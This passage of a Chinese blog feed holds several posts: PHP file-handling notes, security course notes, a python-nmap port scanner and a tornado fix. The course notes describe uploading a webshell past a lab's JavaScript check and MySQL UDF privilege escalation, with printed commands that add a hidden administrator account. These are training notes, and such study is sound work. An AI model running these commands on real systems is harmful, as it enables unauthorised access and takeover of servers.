除了处理错误的方式不同之外,在其他方面都是相同的:"></a><strong>include</strong> 和require 除了处理错误的方式不同之外,在其他方面都是相同的:</h3><ul><li><strong>require</strong> 生成一个致命错误(<strong>E_COMPILE_ERROE</strong>),在错误发生后脚本会停止执行.</li><li><strong>include</strong> 生成一个警告(<strong>E_WARNING</strong>),在错误发生后脚本会继续执行.</li></ul><p><strong>Tips</strong>:</p><ul><li><strong>require</strong> 一般放在PHP文件的最前面,程序执行前就会先导入要应用的文件;</li><li><strong>include</strong> 一般放在程序的流程控制中,当程序执行时碰到才会引用,简化程序的执行流程;</li><li><strong>require</strong> 引入的文件有错误时,执行会中断,并返回一个致命错误;</li><li><strong>include</strong> 引入的文件有错误时,会继续执行,并返回一个警告;</li></ul><h2 id="3-PHP-文件处理"><a href="#3-PHP-文件处理" class="headerlink" title="3.PHP 文件处理"></a>3.PHP 文件处理</h2><ul><li><strong>fopen()函数用于在PHP中打开文件</strong>,此函数的第一个参数还有要打开的文件的名称,第二个参数规定打开文件方式,若fopen()函数<strong>未能打开指定的文件,则会返回 0 ( false</strong> )  . </li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">只读。在文件的开头开始。</td></tr><tr><td align="left">r+</td><td align="left">读/写。在文件的开头开始。</td></tr><tr><td align="left">w</td><td align="left">只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td align="left">w+</td><td align="left">读/写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td align="left">a</td><td align="left">追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</td></tr><tr><td align="left">a+</td><td align="left">读/追加。通过向文件末尾写内容，来保持文件内容。</td></tr><tr><td align="left">x</td><td align="left">只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr><tr><td align="left">x+</td><td align="left">读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr></tbody></table><ul><li><strong>fclose()</strong>函数用户关闭打开的文件.</li><li>检测文件末尾(EOF)<ul><li><strong>feof()</strong>函数检测是否已到达文件末尾(EOF).</li></ul></li><li><strong>fgets()</strong>逐行读取文件,在调用该函数之后，文件指针会移动到下一行。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = fopen(<span class="string">"welcome.txt"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="comment">// 读取文件每一行，直到文件结尾</span></span><br><span class="line"><span class="keyword">while</span>(!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> fgets($file). <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>fgetc()</strong>函数用于从文件中逐字符读取文件,在调用该函数后,文件指针会移动到下一个字符.</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> fgetc($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h4><h5 id="PHP对逗号分隔符文件-csv-的处理"><a href="#PHP对逗号分隔符文件-csv-的处理" class="headerlink" title="PHP对逗号分隔符文件(*.csv)的处理"></a>PHP对逗号分隔符文件(*.csv)的处理</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fh=fopen(<span class="string">"a.csv"</span>,<span class="string">"r"</span>);<span class="comment">//这里我们只是读取数据，所以采用只读打开文件流</span></span><br><span class="line">$arr=fgetcsv($fh);<span class="comment">//这个函数就是读取CSV文件的函数，他把文本读入后转为数组存储在$arr中</span></span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$value)&#123;<span class="keyword">echo</span> $value;&#125;<span class="comment">//循环输出所有的值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> <strong>CSV</strong>文本编码必须和HTML的编码相同,否则使用PHP写道HTML中,用户会看到乱码.也可以使用<strong>iconv</strong>转码函数进行转码.</p><h5 id="如果打开一个文件-文件名为中文-如果系统编码和当前文件编码不一致-会导致文件找不到无法打开-解决方法是用iconv函数编码转换成一致"><a href="#如果打开一个文件-文件名为中文-如果系统编码和当前文件编码不一致-会导致文件找不到无法打开-解决方法是用iconv函数编码转换成一致" class="headerlink" title="如果打开一个文件,文件名为中文,如果系统编码和当前文件编码不一致,会导致文件找不到无法打开,解决方法是用iconv函数编码转换成一致"></a>如果打开一个文件,文件名为中文,如果系统编码和当前文件编码不一致,会导致文件找不到无法打开,解决方法是用iconv函数编码转换成一致</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fpath=iconv(<span class="string">'UTF-8'</span>,<span class="string">'GB2312'</span>,<span class="string">"a.csv"</span>);</span><br><span class="line">$file=fopen($fpath,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="comment">//此处省略相关操作</span></span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="PHP" scheme="http://www.fangmingxuan.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://www.fangmingxuan.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>T3SEC总结</title>
    <link href="http://www.fangmingxuan.com/2020/06/T3sec%E6%80%BB%E7%BB%93/"/>
    <id>http://www.fangmingxuan.com/2020/06/T3sec%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-05T06:18:24.822Z</published>
    <updated>2020-06-05T06:19:39.517Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC总结"><a href="#T3SEC总结" class="headerlink" title="T3SEC总结"></a>T3SEC总结</h1>    <div id="aplayer-YcQEkgVa" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h1 id="主题-揭秘黑客如何通过木马控制目标服务器-webshell"><a href="#主题-揭秘黑客如何通过木马控制目标服务器-webshell" class="headerlink" title="主题:揭秘黑客如何通过木马控制目标服务器-webshell"></a>主题:揭秘黑客如何通过木马控制目标服务器-webshell</h1><p><strong>学习前需要了解的内容</strong>:</p><ul><li>1.了解web的基础的原理(http协议…)</li><li>2.对安全工具有一定的了解(burpsuite.中国菜刀等)</li></ul><p>靶机:upload-labs</p><p>webshell是什么:其实就是一个网页木马</p><p><strong>分析:</strong></p><ul><li><p><strong>1.分析上传点:</strong> 这是一个js过滤,前端过滤,所有前端过滤都是不安全的.checkFile()这个函数进行了对文件后缀格式的一个限制<strong>pass01</strong></p></li><li><p><strong>2. 方法:</strong></p><ul><li><p>通过burpsuite绕过js前端验证过滤上传webshell</p></li><li><p>拦截代理:浏览器需要设置代理 ,—–Burpsuite设置</p></li><li><p>通过浏览器审计工具绕过JS 验证,上传webshell(前端知识有一定的了解)</p></li><li><p><strong>思路</strong>:关闭事件,删除调用函数,修改函数体里面的过滤策略等.</p></li><li><p><strong>中国菜刀连接上传的**</strong>webshell<strong>**控制目标服务器</strong></p></li><li><p>中国菜刀连接上传额webs hell控制目标服务器进行上传文件.下载文件,等其他权限的获取</p></li></ul></li></ul><h1 id="主题-揭秘黑客如何拿下目标最高权限"><a href="#主题-揭秘黑客如何拿下目标最高权限" class="headerlink" title="主题:揭秘黑客如何拿下目标最高权限"></a>主题:揭秘黑客如何拿下目标最高权限</h1><p>课程前言:</p><h2 id="1-论提权的重要性"><a href="#1-论提权的重要性" class="headerlink" title="1.论提权的重要性"></a><strong>1.论提权的重要性</strong></h2><ul><li>我们在渗透过程一般都会获得普通用户的权限,在获取系统某些关键信息的时候会受到权限的限制,因此作为安全渗透测试工程师,掌握提权是一项必备的重要技能.     </li></ul><h2 id="2-提权的分类"><a href="#2-提权的分类" class="headerlink" title="2.提权的分类"></a><strong>2.提权的分类</strong></h2><ul><li><p>数据库提权 </p></li><li><p>web提权</p></li><li><p>操作系统相关提权</p></li></ul><h2 id="3-本期课程内容"><a href="#3-本期课程内容" class="headerlink" title="3.本期课程内容:"></a><strong>3.</strong>本期课程内容:</h2><ul><li>主要讲UDF提权</li></ul><h2 id="4-学习本课程需要掌握哪些基础知识"><a href="#4-学习本课程需要掌握哪些基础知识" class="headerlink" title="4.学习本课程需要掌握哪些基础知识:"></a><strong>4.</strong>学习本课程需要掌握哪些基础知识:</h2><ul><li><p>数据库相关基础</p></li><li><p>操作系统基础</p></li><li><p>掌握一些web安全基础</p></li></ul><h2 id="5-环境-phpstudy"><a href="#5-环境-phpstudy" class="headerlink" title="5.环境:phpstudy"></a>5.<strong>环境:phpstudy</strong></h2><ul><li><p>mysql</p></li><li><p>apache</p></li><li><p>php解析器</p></li></ul><h2 id="6-数据库提权前提条件-已经获得数据库的用户名和密码"><a href="#6-数据库提权前提条件-已经获得数据库的用户名和密码" class="headerlink" title="6.数据库提权前提条件:已经获得数据库的用户名和密码*"></a>6.<strong>数据库提权前提条件</strong>:已经获得数据库的用户名和密码*</h2><ul><li><p>数据库的用户密码渗透:</p><ul><li><p>通过上传webshell到服务器–&gt;利用菜刀工具下载网站的连接数据库的文件 如何判断网站的哪一个文件是连接数据库的文件db_config.php</p></li><li><p>数据库用户名密码:用户名:root 密码:root</p></li></ul></li></ul><h2 id="7-数据库提权-利用数据库的UDF提权-User-Defined-Function-用户自定义函数"><a href="#7-数据库提权-利用数据库的UDF提权-User-Defined-Function-用户自定义函数" class="headerlink" title="7.数据库提权:**利用数据库的UDF提权(User Defined Function:用户自定义函数.)**"></a>7.<strong>数据库提权:**</strong>利用数据库的UDF提权(User Defined Function:用户自定义函数.)**</h2><ul><li><p>UDF提权属于版本提权,版本不同方法有一些小区别</p></li><li><p>区别在于生成udf文件保存的目录不一样 </p><ul><li><p>mysql&lt;5.1 –&gt;生成UDF路径可放在C:windows/system32/</p></li><li><p>mysql&gt;=5.1 –&gt; 生成udf(.dll)路径放在 mysql安装目录下的\lib\plugin目录下–&gt;如何通过数据库来找</p></li></ul></li><li><p>mysql&gt;select $$plugin_dir;</p></li><li><p>脚本自动生成</p></li></ul><h2 id="开始提权-提权脚本"><a href="#开始提权-提权脚本" class="headerlink" title="开始提权:提权脚本"></a><strong>开始提权:提权脚本</strong></h2><ul><li><p>利用提权脚本—-&gt;去生成udf文件</p></li><li><p>host:输入服务端主机名或服务器ip地址</p></li><li><p>name: 输入用户名</p></li><li><p>pass: 密码</p></li><li><p>dbname:数据库名字mysql安装好后默认</p></li><li><p>利用提权脚本—&gt;生成udf文件按(.dll) </p></li></ul><p><strong>select sys_eval(‘net user moon$ 123456 /add &amp; net localgroup administrators moon$ /add’)</strong> 创建moon$ 密码为123456 同时提升管理员权限</p><ul><li><p><strong>直接登录数据库进行提权</strong></p><ul><li><p><em>create function cmdshell returns string soname ‘moonudf.dll’;</em></p></li><li><p><em>select cmdshell(‘net user waitalone waitalone.cn /add’);</em></p></li><li><p><em>select cmdshell(‘net localgroup administrators waitalone /add’);</em></p></li></ul></li><li><p><strong>利用dos开启远程桌面服务</strong></p></li></ul><h2 id="信息安全提权分类"><a href="#信息安全提权分类" class="headerlink" title="信息安全提权分类"></a>信息安全提权分类</h2><ul><li><p>数据库提权:udf提权 mof提权 反弹端口连接提权</p></li><li><p>web安全提权: SQL注入提权,webshell提权,web中间件漏洞提权等</p></li><li><p>操作系统提权:系统内核溢出提权,错误的系统配置提权,组策略首选项提权,DLL劫持提权,第三方软件 /服务的提权 </p></li><li><p>安卓提权等</p></li></ul><h1 id="主题-寻找网站漏洞-漏洞挖掘"><a href="#主题-寻找网站漏洞-漏洞挖掘" class="headerlink" title="主题:寻找网站漏洞:漏洞挖掘"></a>主题:寻找网站漏洞:漏洞挖掘</h1><h2 id="渗透测试VS代码审计"><a href="#渗透测试VS代码审计" class="headerlink" title="渗透测试VS代码审计:"></a>渗透测试VS代码审计:</h2><ul><li><p><strong>渗透测试**</strong>(<strong><strong>黑盒测试</strong></strong>):**渗透测试的目标是一个黑盒子,我们并不关心软件产品内部的代码结构.我们只知道整个web站点发起一些参数提交,达到我们利用某个漏洞的额攻击效果.</p><ul><li><p><strong>特点</strong>:它能够相对于发现操作系统和网络服务宗全形的安全,而不仅仅是对web站点的漏洞挖掘</p></li><li><p><strong>注意</strong>:渗透测试不是真正意义的漏洞挖掘,他仅仅是通过探测或者验证的方式确定漏洞的可利用性.</p></li></ul></li><li><p><strong>代码审计**</strong>(<strong><strong>白盒测试</strong></strong>)**:是指有一定安全经验的相关人员,通过阅读开发文档或者网站的源代码,以自动化分析工具或者人工分析对应用程序进行深入分析.高效全面地发现系统代码的缺陷.或者开发人员不安全的编程习惯.并知道开发人员进行修复,保障应用系统的安全运行.</p><ul><li><strong>特点**</strong>:**更多是一个静态的代码审计,代码审计更加彻底发现代码风险.</li></ul></li><li><p><strong>渗透测试VS代码审计的关系</strong></p><ul><li><p>相互补充,相互强化.</p></li><li><p>代码审计发现问题,渗透测试确定可利用性.</p></li><li><p>渗透测试发现问题,代码审计确定成因.</p></li></ul></li></ul><h2 id="漏洞挖掘过程与方式"><a href="#漏洞挖掘过程与方式" class="headerlink" title="漏洞挖掘过程与方式:"></a>漏洞挖掘过程与方式:</h2><ul><li><p><strong>漏洞挖掘的过程:</strong></p><ul><li><p>代码审计准备(安全知识+代码审计工具)</p></li><li><p>采用的方式:自动化工具+人工</p></li><li><p>找到有漏洞的代码</p></li><li><p>最终给出修复方案,指导开发人员完善我们的应用系统.</p></li></ul></li><li><p><strong>工具漏洞的挖掘方式</strong></p><ul><li><p>优点:效率高</p></li><li><p>缺点:对漏洞存在误报</p></li></ul></li><li><p><strong>人工漏洞挖掘方式</strong></p><ul><li><p>优点:挖掘漏洞的精准</p></li><li><p>缺点:效率低下</p></li></ul></li><li><p><strong>人工+工具漏洞挖掘方式:结合工具和人工漏洞挖掘有点,相互补充,相互强化.</strong></p></li></ul><h2 id="学习本课程需要掌握的知识体系"><a href="#学习本课程需要掌握的知识体系" class="headerlink" title="学习本课程需要掌握的知识体系:"></a>学习本课程需要掌握的知识体系:</h2><ul><li><p>web安全体系知识(http协议原理,web安全top10漏洞,安全工具)</p></li><li><p>具备一定的语法基础(Html,CSS JS，ASP，<strong>PHP</strong>,JSP),以及代码的调试</p></li><li><p>掌握常用的数据库(<strong>Mysql</strong>,Oracle,Sqlserver等等)</p></li><li><p>对开发语言的框架知识有一定的了解,MVC(Model View Controller),SSM(Spring Struts Mybatis),SSH(Spring Struts Hibernate)等等</p></li></ul><p><strong>seay主要审计php语言 fortify:java语言</strong></p><h1 id="主题-获取管理员账号密码-窃取cookie"><a href="#主题-获取管理员账号密码-窃取cookie" class="headerlink" title="主题:获取管理员账号密码-窃取cookie"></a>主题:获取管理员账号密码-窃取cookie</h1><p><strong>回顾</strong>:</p><ul><li><p>渗透测试vs代码审计:</p><ul><li><p>渗透测试VS代码审计</p></li><li><p>代码审计及特点</p></li><li><p>渗透测试vs代码审计关系</p></li></ul></li><li><p>漏洞挖掘方式</p><ul><li><p>漏洞挖掘过程</p></li><li><p>漏洞挖掘方式 </p></li></ul></li><li><p>seay代码审计使用 </p></li></ul><h2 id="论XSS漏洞的重要性"><a href="#论XSS漏洞的重要性" class="headerlink" title="论XSS漏洞的重要性"></a>论XSS漏洞的重要性</h2><ul><li>关联web安全之XSS体系化课程里面的内容.</li></ul><h2 id="XSS体系知识"><a href="#XSS体系知识" class="headerlink" title="XSS体系知识:"></a>XSS体系知识:</h2><ul><li>XSS漏洞原理与检测机制</li><li><strong>XSS反射型.存储型.DOM型</strong></li><li>XSS漏洞针对客户端(获取cookie,转发邮件,放马,刷流量)</li><li>XSS漏洞针对服务端(劫持后台,篡改页面,蠕虫,内网扫描)</li><li>XSS漏洞绕过编码技术</li><li>XSS漏洞ｆｕｚｚｉｎｇ　Ｘｓｓｅｒ模糊测试</li><li>XSS漏洞开发与漏洞修复</li><li>arc-xss漏洞需求分析</li><li>aec-xss漏洞挖掘过程</li><li>arc-xss漏洞挖掘利用</li><li>aec-xss漏洞挖掘验证</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP指令</title>
    <link href="http://www.fangmingxuan.com/2020/06/SQLMAP%E6%8C%87%E4%BB%A4/"/>
    <id>http://www.fangmingxuan.com/2020/06/SQLMAP%E6%8C%87%E4%BB%A4/</id>
    <published>2020-06-05T05:48:13.136Z</published>
    <updated>2020-06-05T05:55:43.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQLMAP指令"><a href="#SQLMAP指令" class="headerlink" title="SQLMAP指令"></a>SQLMAP指令</h1><p><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/SQLMAP%E6%8C%87%E4%BB%A4.png"  alt="SQLMAP指令"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第十四讲-python-nmap</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E5%9B%9B%E8%AE%B2-python-nmap/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E5%9B%9B%E8%AE%B2-python-nmap/</id>
    <published>2020-05-21T10:22:55.553Z</published>
    <updated>2020-06-25T03:29:24.573Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第十三讲-python-nmap"><a href="#T3SEC-—–第十三讲-python-nmap" class="headerlink" title="T3SEC —–第十三讲:python-nmap"></a>T3SEC —–第十三讲:python-nmap</h1>    <div id="aplayer-cagkbnaw" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p><strong>Nmap</strong>–扫描网上电脑开放的连接端口</p><p>可用于评估系统漏洞    </p><h2 id="案例前提条件"><a href="#案例前提条件" class="headerlink" title="案例前提条件:"></a>案例前提条件:</h2><ul><li>python基础   pip  </li><li>TCP/IP</li><li>Python 3.7.x</li><li>python-nmap<ul><li><strong>portscanner</strong>() —扫描</li><li><strong>portscannerhostdict</strong>() —  返回结果</li></ul></li></ul><h2 id="实现内网端口扫描工具"><a href="#实现内网端口扫描工具" class="headerlink" title="实现内网端口扫描工具"></a>实现内网端口扫描工具</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#准备工作:</span></span><br><span class="line"><span class="comment">#windows: nmap.exe  </span></span><br><span class="line"><span class="comment">#python-nmap    :pip  install python-nmap</span></span><br><span class="line"><span class="comment">#目标: 实现指定ip/ip范围 的端口扫描神器'</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># www.baidu.com/127.0.0.1/192.168.0-255.1-255/  192.168.1.1/24</span></span><br><span class="line"><span class="comment">#1-8080/80/1443,8080,443</span></span><br><span class="line"><span class="comment">#-sV </span></span><br><span class="line"><span class="comment">#scan(self,hosts='',ports=None,arguments='-sV')</span></span><br><span class="line"></span><br><span class="line">scan_row=[]</span><br><span class="line">input_data=input(<span class="string">"Please input hosts and ports:"</span>)<span class="comment">#12.169.1.1 8080,443</span></span><br><span class="line">scan_row =input_data.split(<span class="string">" "</span>)</span><br><span class="line"><span class="comment">#输入是否满足条件</span></span><br><span class="line"><span class="keyword">if</span> len(scan_row)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Input error.Example \"192.168.1.1 80,443\""</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">hosts=scan_row[<span class="number">0</span>]<span class="comment">#主机</span></span><br><span class="line">port=scan_row[<span class="number">1</span>]<span class="comment">#端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个扫描对象</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    nm=nmap.PortScanner()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"Nmap not found"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nm.scan(hosts=hosts,arguments=<span class="string">'-v -sS -p'</span>+port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历扫描主机</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> nm.all_hosts():</span><br><span class="line">    print(<span class="string">'-'</span>*<span class="number">40</span>)</span><br><span class="line">    print(<span class="string">'Host:&#123;&#125;(&#123;&#125;)'</span>.format(host,nm[host].hostname()))</span><br><span class="line">    print(<span class="string">'State:&#123;&#125;'</span>.format(nm[host].state()))<span class="comment">#输出主机状态  up/down</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> proto <span class="keyword">in</span> nm[host].all_protocols():<span class="comment">#遍历扫描所有协议</span></span><br><span class="line">        print(<span class="string">"-"</span>*<span class="number">20</span>)</span><br><span class="line">        print(<span class="string">"protocol:&#123;&#125;"</span>.format(proto))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#扫描所有端口所对应的状态</span></span><br><span class="line">        lport=nm[host][proto].keys()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> lport:</span><br><span class="line">            print(<span class="string">"port:&#123;&#125;\tstate:&#123;&#125;"</span>.format(port,nm[host][proto][port][<span class="string">'state'</span>]))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
      <category term="python" scheme="http://www.fangmingxuan.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python 的 tornado框架一直报错的解决方法,其他框架出错可参考</title>
    <link href="http://www.fangmingxuan.com/2020/05/python%E7%9A%84tornado%E6%A1%86%E6%9E%B6%E4%B8%80%E7%9B%B4%E6%8A%A5%E9%94%99/"/>
    <id>http://www.fangmingxuan.com/2020/05/python%E7%9A%84tornado%E6%A1%86%E6%9E%B6%E4%B8%80%E7%9B%B4%E6%8A%A5%E9%94%99/</id>
    <published>2020-05-21T03:45:57.508Z</published>
    <updated>2020-05-21T03:49:32.827Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>    <div id="aplayer-cXQhMtLy" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h2 id="网上找好了好久才知道是系统不同的问题-我这里是windows10"><a href="#网上找好了好久才知道是系统不同的问题-我这里是windows10" class="headerlink" title="网上找好了好久才知道是系统不同的问题,我这里是windows10"></a>网上找好了好久才知道是系统不同的问题,我这里是windows10</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File &quot;D:\python38\lib\site-packages\tornado\tcpserver.py&quot;, line 244, in start       </span><br><span class="line">    self.add_sockets(sockets)</span><br><span class="line">  File &quot;D:\python38\lib\site-packages\tornado\tcpserver.py&quot;, line 165, in add_sockets </span><br><span class="line">  File &quot;D:\python38\lib\site-packages\tornado\netutil.py&quot;, line 279, in add_accept_handler</span><br><span class="line">    io_loop.add_handler(sock, accept_handler, IOLoop.READ)</span><br><span class="line">andler</span><br><span class="line">    self.asyncio_loop.add_reader(fd, self._handle_events, fd, IOLoop.READ)</span><br><span class="line">  File &quot;D:\python38\lib\asyncio\events.py&quot;, line 501, in add_reader</span><br><span class="line">    raise NotImplementedError</span><br><span class="line">NotImplementedError</span><br></pre></td></tr></table></figure><h2 id="原因及解决办法如下"><a href="#原因及解决办法如下" class="headerlink" title="原因及解决办法如下"></a>原因及解决办法如下</h2><p>原来是由于 python3.8 asyncio 在 windows 上默认使用 ProactorEventLoop 造成的，而不是之前的 SelectorEventLoop。jupyter 依赖 tornado，而 tornado 在 window 上需要使用 SelectorEventLoop，所以产生这个报错.</p><p>请看官方文档:<a href="https://www.tornadoweb.org/en/stable/index.html#installation" target="_blank" rel="noopener">https://www.tornadoweb.org/en/stable/index.html#installation</a></p><p>解决方法是,在 tornado开始执行前添加以下代码,在windows下单独处理:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import platfrom</span><br><span class="line">if platform.system()&#x3D;&#x3D;&#39;Windows&#39;:</span><br><span class="line">    import asyncio</span><br><span class="line">    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())</span><br></pre></td></tr></table></figure><p>根据系统的不同导入不同的库。</p><p>在代码中加入上述代码再运行即可,无报错</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="http://www.fangmingxuan.com/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第十三讲-webshell</title>
